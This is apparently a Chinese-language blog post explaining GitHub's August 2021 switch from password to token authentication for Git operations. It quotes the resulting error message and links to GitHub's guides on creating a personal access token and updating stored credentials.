    <url>/post/1d8035c6/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在 2021 年 8 月 13 日之后，当针对 Git 操作进行身份验证时，GitHub 将不再接受纯账户加密码形式，即强制要求使用基于令牌的认证机制。</p>
<p>GitHub 官方表示，这一举措是为了提高 Git 操作的安全性，防止密码撞库等事情发生。</p>
<p>再使用密码去完成身份验证，将无法通过，也就不能进一步执行 Git 操作。</p>
<span id="more"></span>

<p>据悉，与基于密码的传统身份验证机制相比，令牌保护具有以下安全优势：</p>
<ul>
<li><p>唯一 ： 令牌将权限于 GitHub 使用，可按使用次数或按设备生成。</p>
</li>
<li><p>可撤销 ： 令牌可以随时被单独撤销，且无需更新未受影响的其他凭证。</p>
</li>
<li><p>受限 ： 令牌的使用范围可以得到严重控制，例如仅允许执行用例中需要的访问活动。</p>
</li>
<li><p>随机 ： 令牌的复杂度远高于您需要硬性记忆并定期输入的简单密码，因此不受字典或暴力破解等行为的影响。</p>
</li>
</ul>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>命令行返回错误如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">remote: Password authentication is temporarily disabled as part of a brownout. Please use a personal access token instead.</span><br><span class="line">remote: Please see https://github.blog/2020-07-30-token-authentication-requirements-for-api-and-git-operations/ for more information.</span><br></pre></td></tr></table></figure>

<p>解决方法</p>
<ul>
<li><p>创建个人访问令牌教程: <a href="https://docs.github.com/cn/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token">https://docs.github.com/cn/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token</a></p>
</li>
<li><p>密码替换为令牌教程: <a href="https://docs.github.com/cn/get-started/getting-started-with-git/updating-credentials-from-the-macos-keychain">https://docs.github.com/cn/get-started/getting-started-with-git/updating-credentials-from-the-macos-keychain</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>github</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
</search>
